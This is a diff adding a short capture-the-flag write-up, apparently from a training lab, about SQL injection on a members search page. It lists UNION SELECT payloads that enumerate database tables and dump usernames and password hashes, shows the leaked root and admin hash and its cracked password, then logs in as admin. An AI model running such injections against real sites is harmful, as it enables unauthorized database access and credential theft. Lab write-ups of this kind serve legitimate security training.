@@ -1,0 +1,23 @@
+We go to this page: http://10.12.248.13/?page=members
+
+We run a query to find each table with their related database:
+1 OR 1=1 UNION SELECT table_schema,table_name FROM information_schema.columns;
+We find a useful piece of information:
+Title: list_images
+Url : Member_images
+
+We now know in which database the db users are stored.
+1 OR 1=1 UNION SELECT username,password FROM Member_Brute_Force.db_default
+
+ID: 1 OR 1=1 UNION SELECT username,password FROM Member_Brute_Force.db_default 
+First name: root
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+ID: 1 OR 1=1 UNION SELECT username,password FROM Member_Brute_Force.db_default 
+First name: admin
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+Surname being the password if we decrypt 3bf1114a986ba87ed28fc1b5884fc2f8 we get
+shadow
+
+we then log as admin and get the flag
